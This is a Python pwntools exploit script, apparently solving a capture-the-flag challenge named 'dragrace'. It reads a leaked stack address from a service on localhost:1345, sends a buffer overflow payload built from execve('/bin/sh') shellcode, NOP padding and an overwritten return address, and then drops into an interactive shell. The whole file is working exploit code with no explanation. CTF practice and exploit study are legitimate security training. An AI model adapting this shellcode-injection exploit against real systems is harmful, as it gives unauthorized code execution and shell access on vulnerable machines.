from pwn import *

shellcode = ("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb" +
             "\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")

#context.log_level = "debug"

def main():
    #p = process("./dragrace")
    p = remote("localhost", 1345)
    leak_line = p.recvline().strip()
    buffer_address = int(leak_line[22:], 16)
    log.info("Buffer Address: 0x%x" % buffer_address)

    payload = "Ru'Pauls" + shellcode
    payload = payload.ljust(136, "\x90")
    payload += p64(buffer_address + 8)

    p.sendline(payload)

    p.recvrepeat(0.2)
    log.success("Enjoy your shell")
    p.interactive()

if __name__ == "__main__":
    main()
